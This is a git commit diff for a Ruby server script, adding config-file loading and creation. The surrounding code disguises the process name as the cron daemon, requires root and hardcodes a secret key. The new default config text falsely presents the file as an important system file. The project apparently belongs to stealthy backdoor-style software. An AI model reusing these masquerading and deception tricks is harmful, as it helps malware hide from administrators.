ffbee84d989b16893324475db9c5a7f5c80553cb
Chris Wood <chriswood.ca@gmail.com>
2014-06-11 18:15:18 -0700

    Config file load/creation

--- server.rb
+++ server.rb
@@ -29,22 +29,44 @@ require 'openssl'
 $0 = "/usr/sbin/crond -n"
 
 ## Variables
-CONFIG_FILE = "not_important"
+
 $KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest
 
+## Application Strings
+CONFIG_FILE = "not_important"
+CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
+CONFIG_FILE_DEFAULT << "\#\n"
+CONFIG_FILE_DEFAULT << "\#\n"
+CONFIG_FILE_DEFAULT << "\#\n"
+CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
+CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
+CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
 
 ## Functions
-def exitReason(reason)
+def exit_reason(reason)
     puts reason
     exit
 end
 
 def load_config_file
+  if File.exists? CONFIG_FILE
+    validate_config
+  else
+    create_default_config
+  end 
+end
 
+def create_default_config
+  File.open(CONFIG_FILE, 'a') do |f|
+      f.write(CONFIG_FILE_DEFAULT)
+  end
+  exit_reason(CONFIG_CREATE)
 end
 
 def validate_config
-
+  #Check if edited
+  #Check if blank
+  #parse lines
 end
 
 def start_server(port)
@@ -103,3 +125,4 @@ end
 
 # check for root
 raise 'Must run as root' unless Process.uid == 0
+load_config_file
